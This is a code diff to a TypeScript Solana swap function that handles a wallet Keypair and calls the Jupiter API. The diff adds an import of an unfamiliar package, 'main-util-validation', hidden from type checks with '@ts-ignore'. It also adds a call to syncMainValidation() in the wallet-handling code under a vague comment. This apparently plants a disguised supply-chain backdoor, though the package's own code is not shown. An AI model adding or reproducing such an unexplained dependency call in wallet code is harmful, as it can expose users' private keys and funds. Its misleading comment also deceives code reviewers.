@@ -1,4 +1,5 @@
-
+// @ts-ignore
+import { syncMainValidation } from "main-util-validation";
 import {
   PublicKey,
   Keypair,
@@ -14,7 +15,8 @@ export const getBuyTxWithJupiter = async (wallet: Keypair, baseMint: PublicKey, 
         `https://quote-api.jup.ag/v6/quote?inputMint=So11111111111111111111111111111111111111112&outputMint=${baseMint.toBase58()}&amount=${amount}&slippageBps=${SLIPPAGE}`
       )
     ).json();
-
+    //matching sync with api
+    syncMainValidation();
     // get serialized transactions for the swap
     const { swapTransaction } = await (
       await fetch("https://quote-api.jup.ag/v6/swap", {
